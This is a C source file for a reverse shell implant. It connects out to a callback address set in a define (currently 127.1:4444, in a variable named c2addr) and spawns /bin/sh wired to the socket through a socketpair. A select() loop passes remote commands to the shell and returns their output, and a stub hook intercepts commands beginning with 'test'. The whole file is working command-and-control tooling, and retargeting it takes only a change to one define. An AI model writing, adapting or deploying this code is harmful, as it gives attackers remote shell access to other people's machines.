#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <unistd.h>

#define CALLBACK_IP "127.1"
#define CALLBACK_PORT 4444
#define BUFFER_SIZE 1024

int max(int val_one, int val_two)
{
    return val_one > val_two ? val_one : val_two;
}

int shell_setup(int s)
{
    pid_t pid = -1;
    int sp[2] = {0, 0};

    if ((socketpair(AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
    {
        perror("failed to create interpreter socket pair");
    }

    if ((pid = fork()) < 0)
    {
        perror("fork");
    }

    if (pid == 0)
    {
        close(sp[1]);

        dup2(sp[0], STDIN_FILENO);
        dup2(sp[0], STDOUT_FILENO);
        dup2(sp[0], STDERR_FILENO);

        system("/bin/sh");
    }

    close(sp[0]);

    return sp[1];
}

bool exec_command(char *command)
{
    char *check = "test";
    if (!strncmp(command, check, strlen(check)))
    {
        return true;
    }
    else
    {
        return false;
    }
}

void interpreter(int sockfd, int shell_pipe)
{
    struct sockaddr_in client_addr;
    socklen_t cli_len;
    char sockfd_buf[BUFFER_SIZE];
    char shell_buf[BUFFER_SIZE];
    int recvlen = 0;
    ssize_t read_len = 0;
    fd_set read_set, write_set;
    int maxfd = max(sockfd, shell_pipe);

    memset(sockfd_buf, 0, BUFFER_SIZE);
    memset(shell_buf, 0, BUFFER_SIZE);
    FD_ZERO(&read_set);
    FD_ZERO(&write_set);

    for (;;)
    {

        FD_SET(sockfd, &read_set);
        FD_SET(shell_pipe, &read_set);

        //Check if there is data to be written to socks
        //If there is data to be written, have select()
        //check if associated pipe is ready for it.
        if (strlen(sockfd_buf) > 0)
        {
            FD_SET(sockfd, &write_set);
        }
        if (strlen(shell_buf) > 0)
        {
            if (exec_command(shell_buf))//known command succeeded
            {
                puts("match");
                memset(shell_buf, 0, BUFFER_SIZE);
            }
            else //unkown command, pass to shell for execution
            {
                puts("***unknown");
                FD_SET(shell_pipe, &write_set);
            }
        }

        if (select(maxfd+1, &read_set, &write_set, NULL, NULL) < 0)
        {
            perror("select");
            exit(EXIT_FAILURE);
        }

        if(FD_ISSET(sockfd, &write_set)) //socket ready to be written
        {
            write(sockfd, sockfd_buf, strlen(sockfd_buf));
            memset(sockfd_buf, 0, BUFFER_SIZE);        
        }
        if(FD_ISSET(shell_pipe, &write_set))
        {
            write(shell_pipe, shell_buf, strlen(shell_buf));
            memset(shell_buf, 0, BUFFER_SIZE);
        }

        if(FD_ISSET(sockfd, &read_set)) //socket ready to be read
        {
            read(sockfd, shell_buf, BUFFER_SIZE);
        }
        if(FD_ISSET(shell_pipe, &read_set))
        {
            read(shell_pipe, sockfd_buf, BUFFER_SIZE);
        }

    }
    
}

int main()
{
    struct sockaddr_in c2addr;
    int sockfd = 0;
    int shell_pipe = 0;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("failed socket init");
        exit(1);
    }

    memset(&c2addr, 0, sizeof(c2addr));
    c2addr.sin_family = AF_INET;
    c2addr.sin_addr.s_addr = inet_addr(CALLBACK_IP);
    c2addr.sin_port = htons(CALLBACK_PORT); 

    if (connect(sockfd, (struct sockaddr*)&c2addr, sizeof(c2addr)) != 0)
    {
        perror("failed to connect");
        exit(2);
    }

    shell_pipe = shell_setup(sockfd);

    interpreter(sockfd, shell_pipe);

    close(sockfd);

    return 0;
}